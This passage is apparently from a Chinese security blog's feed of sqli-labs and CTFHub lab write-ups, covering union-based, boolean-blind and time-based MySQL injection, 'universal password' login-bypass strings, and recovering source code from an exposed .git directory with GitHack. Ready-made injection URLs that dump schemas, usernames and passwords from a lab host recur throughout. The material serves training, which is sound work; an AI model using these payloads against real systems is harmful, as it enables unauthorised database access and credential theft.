<p>那如何获取第二个表呢？思考一下！<br>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%201,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092316.png" alt="image"></p>
<p>以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。<br>当你按照方法运行结束后，就可以获取到所有的表的名字</p>
<h3 id="利用regexp获取users表中的列"><a href="#利用regexp获取users表中的列" class="headerlink" title="利用regexp获取users表中的列"></a>利用regexp获取users表中的列</h3><p>sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
<p>payload请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092317.png" alt="image"></p>
<p>上述语句时选择 users 表中的列名是否有 us**的列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20column_name%20regexp%20%27^username%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092318.png" alt="image"></p>
<p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确的</p>
<h3 id="利用ord-函数和mid-函数获取users表的内容"><a href="#利用ord-函数和mid-函数获取users表的内容" class="headerlink" title="利用ord()函数和mid()函数获取users表的内容"></a>利用ord()函数和mid()函数获取users表的内容</h3><p>sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68</span><br></pre></td></tr></table></figure>
<p>payload请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))&#x3D;%2068--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092319.png" alt="image"></p>
<p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可</p>
<hr>
<p>总结：以上我们通过使用不同的语句，将通过布尔盲注 SQL 的所有<br>的 payload 进行演示了一次。想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs-Background-2 盲注</title>
    <url>/posts/175b777c.html</url>
    <content><![CDATA[<h2 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h2><blockquote>
<p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
</blockquote>
<p>从background-1 中，我们可以知道盲注分为三类 <strong>基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注</strong>。</p>
<h2 id="基于布尔SQL盲注——构造逻辑判断"><a href="#基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="基于布尔SQL盲注——构造逻辑判断"></a>基于布尔SQL盲注——构造逻辑判断</h2><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>此函数为截取字符串一部分。<strong>MID(column_name,start[,length])</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要提取字符的字段</td>
</tr>
<tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td>
</tr>
</tbody></table>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID(DATABASE(),1,1)&gt;’a’     &#x2F;&#x2F;数据库名第一位</span><br><span class="line">MID(DATABASE(),2,1)         &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
<p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
<h3 id="substr-函数和substring-函数"><a href="#substr-函数和substring-函数" class="headerlink" title="substr()函数和substring()函数"></a>substr()函数和substring()函数</h3><p><strong>Substr()</strong> 和 <strong>substring()</strong> 函数实现的功能是一样的，均为截取字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string substring(string, start, length)</span><br><span class="line">string substr(string, start, length)</span><br></pre></td></tr></table></figure>

<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(DATABASE(),1,1)&gt;’a’  &#x2F;&#x2F;数据库名第一位</span><br><span class="line">substr(DATABASE(),2,1)      &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
<p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
<h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p><strong>Left()</strong> 得到字符串左部指定个数的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(string,n)        &#x2F;&#x2F;string为要截取的字符串，n为长度。</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>
<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
<p>同样的，string可以为自行构造的SQL语句</p>
<h3 id="ORD-函数和ascii-函数"><a href="#ORD-函数和ascii-函数" class="headerlink" title="ORD()函数和ascii()函数"></a>ORD()函数和ascii()函数</h3><p>返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID(DATABASE(),1,1))&gt;114</span><br><span class="line">ascii(MID(DATABASE(),1,1))&gt;114</span><br></pre></td></tr></table></figure>
<p>意为检测<strong>database()</strong> 的第一位<strong>ASCII</strong>码是否大于114，也即是‘r’</p>
<h3 id="regexp-函数"><a href="#regexp-函数" class="headerlink" title="regexp()函数"></a>regexp()函数</h3><p>正则注入此处不做详解可参考文章<br><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">https://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
<h2 id="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的SQL盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的SQL盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的SQL盲注——构造payload让信息通过错误提示回显出来</h2><p><a href="https://bugs.mysql.com/bug.php?id=8652">mysql-bug #8652</a></p>
<p>BUG #8652的主要内容就是在同时使用<strong>RAND()**函数，聚集函数</strong>COUNT()<strong>和</strong>GROUP BY**子句进行操作时会返回duplicate key 错误，而这个错误将会披露关键信息</p>
<p>详细原理可以参考这篇文章：<a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p>
<h2 id="基于时间的SQL盲注——延时注入"><a href="#基于时间的SQL盲注——延时注入" class="headerlink" title="基于时间的SQL盲注——延时注入"></a>基于时间的SQL盲注——延时注入</h2><p>使用sleep()函数<br>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</span><br></pre></td></tr></table></figure>
<p>if判断语句，条件为假，执行sleep</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sleep(find_in_set(mid(@@version, 1, 1),&#39;0,1,2,3,4,5,6,7,8,9,.&#39;));</span><br></pre></td></tr></table></figure>
<p>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-1-4</title>
    <url>/posts/1150102b.html</url>
    <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
<p><img src="https://qiniu.hzktester.top/tp2020092304.png" alt="image"></p>
<h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092305.png" alt="image"></p>
<p>证明有三个字段</p>
<h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p>
<p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092306.png" alt="image"></p>
<p>得到能回显的字段是2和3</p>
<h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
<p>此时的SQL语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092301.png" alt="image"></p>
<h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>
<p>此时的SQL语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092302.png" alt="image"></p>
<h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure>
<p>此时的SQL语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092303.png" alt="image"></p>
<h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure>
<p>此时的SQL语句为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092307.png" alt="image"></p>
<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
<p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p>
<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>可以成功注入的有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">) or &#39;1&#39;&#x3D;(&#39;1&#39; </span><br><span class="line">) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
<p>其余的ppayload于less1中一致，只需要将less1中的’换成’)即可</p>
<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>这里id参数使用了””和()包装</p>
<p>可以成功注入的有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“) or ”1”&#x3D;(“1</span><br><span class="line">“) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
<p>其余的ppayload于less1中一致，只需要将less1中的’换成”)即可</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs-Background-1 基础知识</title>
    <url>/posts/cd41c5ab.html</url>
    <content><![CDATA[<p>此处介绍一些<strong>mysql</strong>注入的基础知识</p>
<h2 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ol>
<li>基于错误的SQL注入</li>
<li>联合查询的类型</li>
<li>堆查询注入</li>
<li>SQL盲注<ul>
<li>基于布尔的SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
</li>
</ol>
<h3 id="基于如何处理输入的SQL查询（数据类型）"><a href="#基于如何处理输入的SQL查询（数据类型）" class="headerlink" title="基于如何处理输入的SQL查询（数据类型）"></a>基于如何处理输入的SQL查询（数据类型）</h3><ol>
<li>基于字符串</li>
<li>数字或整数为基础的</li>
</ol>
<h3 id="基于程度和顺序的注入（哪里发生了影响）"><a href="#基于程度和顺序的注入（哪里发生了影响）" class="headerlink" title="基于程度和顺序的注入（哪里发生了影响）"></a>基于程度和顺序的注入（哪里发生了影响）</h3><ol>
<li>一阶注入</li>
<li>二阶注入<blockquote>
<p>一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存<br>储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间<br>接的对 WEB 产生危害，这样的就被称为是二阶注入</p>
</blockquote>
</li>
</ol>
<h3 id="基于注入位置上的"><a href="#基于注入位置上的" class="headerlink" title="基于注入位置上的"></a>基于注入位置上的</h3><ol>
<li>通过用户输入的表单域的注入</li>
<li>通过cookie注入</li>
<li>通过服务器变量注入。（基于头部信息的注入）</li>
</ol>
<h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><p>介绍几个常用函数</p>
<ol>
<li><strong>version()</strong>——MySQL版本</li>
<li><strong>user()</strong>——数据库用户名</li>
<li><strong>datebase()</strong>——数据库名</li>
<li><strong>@@datadir</strong>——数据库路径</li>
<li><strong>@@version_compile_os</strong>——操作系统版本</li>
</ol>
<h2 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h2><p><a href="http://www.cnblogs.com/lcamry/p/5715634.html">函数具体介绍</a></p>
<ol>
<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
<li>concat_ws(separator,str1,str2,…)——含有分隔符的连接字符串</li>
<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了</li>
</ol>
<h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p>ps：–+可以用#替换，url提交过程中url编码后的#为%23</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
<p>一般的代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
<h2 id="union操作符的介绍"><a href="#union操作符的介绍" class="headerlink" title="union操作符的介绍"></a>union操作符的介绍</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT<br>语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的<br>列的顺序必须相同。</p>
<h3 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL UNION 语法"></a>SQL UNION 语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<h3 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL UNION ALL 语法"></a>SQL UNION ALL 语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<h2 id="sql中的逻辑运算"><a href="#sql中的逻辑运算" class="headerlink" title="sql中的逻辑运算"></a>sql中的逻辑运算</h2><p>首先提出一个问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br></pre></td></tr></table></figure>
<p>上面这条语句为什么能够选择出id=1的内容，and 1=1到底起了什么作用？这里就要清除sql语句执行顺序了。同时这个问题我们在使用万能密码的时候会用到。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’admin’</span><br></pre></td></tr></table></figure>
<p>我们可以用’ or 1=1#作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql语句为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select * from admin where username&#x3D;’admin’ and password&#x3D;’’or 1&#x3D;1#’</span><br></pre></td></tr></table></figure>
<p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。<br>原因是在where子句后，我们可以看到三个条件语句<strong>username=’admin’ and password=’’ or 1=1</strong>。三个条件用and和or进行拼接。在sql中，我们and的运算优先级大于or的运算优先级。 因此可以看到第一个条件（用 a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and后是假，再与第三<br>个条件 or 运算，因为第三个条件1=1是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了<br><img src="https://qiniu.hzktester.top/tp2020092201.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">①Select * from users where id&#x3D;1 and 1&#x3D;1;</span><br><span class="line">②Select * from users where id&#x3D;1 &amp;&amp; 1&#x3D;1;</span><br><span class="line">③Select * from users where id&#x3D;1 &amp; 1&#x3D;1;</span><br></pre></td></tr></table></figure>
<p>上述三者有什么区别？①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算</p>
<p>③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p>
<p>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要<br>的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从<br>ascii 值反推回字符。（运用较少）</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>Web基础之信息泄露（下）</title>
    <url>/posts/5ca8b352.html</url>
    <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="https://qiniu.hzktester.top/tp2020081824.png" alt="image"></p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
<p>切换版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure>
<p>对比两次提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
<li><p>扫描发现 .git 泄露</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081825.png" alt="image"></p>
</li>
<li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081826.png" alt="image"></p>
</li>
<li><p>执行 git log 查看历史记录</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081827.png" alt="image"></p>
</li>
<li><p>执行 git show 查看提交详情</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081828.png" alt="image"></p>
<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
</li>
</ol>
<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol>
<li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p>
</li>
<li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p> <img src="https://qiniu.hzktester.top/tp2020081829.png" alt="image"></p>
</li>
<li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
<p> <img src="https://qiniu.hzktester.top/tp2020081830.png" alt="image"></p>
</li>
<li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081831.png" alt="image"></p>
</li>
</ol>
<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="https://qiniu.hzktester.top/tp2020081832.png" alt="image"></p>
<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="https://qiniu.hzktester.top/tp2020081833.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081834.png" alt="image"></p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Web基础之信息泄露（上）</title>
    <url>/posts/e414d437.html</url>
    <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="https://qiniu.hzktester.top/tp2020081801.png" alt="image"></p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p>
<p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="https://qiniu.hzktester.top/tp2020081802.png" alt="image"></p>
<p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p>
<p><img src="https://qiniu.hzktester.top/tp2020081803.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081804.png" alt="image"></p>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="https://qiniu.hzktester.top/tp2020081805.png" alt="image"></p>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p>
<p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p>
<p><img src="https://qiniu.hzktester.top/tp2020081806.png" alt="image"></p>
<p>浏览目录找到flag</p>
<p><img src="https://qiniu.hzktester.top/tp2020081807.png" alt="image"></p>
<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<p><img src="https://qiniu.hzktester.top/tp2020081808.png" alt="image"></p>
